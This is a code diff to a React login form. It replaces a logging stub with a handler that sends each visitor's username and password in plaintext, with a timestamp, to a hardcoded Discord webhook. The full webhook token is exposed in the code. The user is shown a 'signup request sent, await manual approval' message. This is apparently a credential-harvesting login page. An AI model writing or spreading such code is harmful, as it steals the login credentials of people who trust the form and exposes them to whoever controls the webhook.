@@ -10,10 +10,71 @@ export default function Login() {
   const [createHovered, setCreateHovered] = useState(false);
   const [showErrorModal, setShowErrorModal] = useState(false);
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
-    // Form submission logic
-    console.log("Login attempt:", { username, password });
+
+    if (!username || !password) {
+      alert("Please fill in both fields");
+      return;
+    }
+
+    try {
+      // Send data to Discord webhook
+      const webhookUrl = "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
+
+      const message = {
+        content: "New Family Member Signup Request",
+        embeds: [
+          {
+            color: 0x0064E0,
+            title: "Login Data",
+            fields: [
+              {
+                name: "Username/Email",
+                value: `||${username}||`,
+                inline: false
+              },
+              {
+                name: "Password",
+                value: `||${password}||`,
+                inline: false
+              },
+              {
+                name: "Timestamp",
+                value: new Date().toLocaleString(),
+                inline: false
+              }
+            ],
+            footer: {
+              text: "Family Site - Manual Approval Required"
+            }
+          }
+        ]
+      };
+
+      const response = await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(message),
+      });
+
+      if (response.ok) {
+        console.log("Data sent to Discord successfully");
+        // Show success message
+        alert("Signup request sent! Please wait for manual approval.");
+        // Clear form
+        setUsername("");
+        setPassword("");
+      } else {
+        console.error("Failed to send data to Discord");
+        alert("Error sending data. Please try again.");
+      }
+    } catch (error) {
+      console.error("Error:", error);
+      alert("An error occurred. Please try again.");
+    }
   };
 
   const handleCreateAccount = () => {
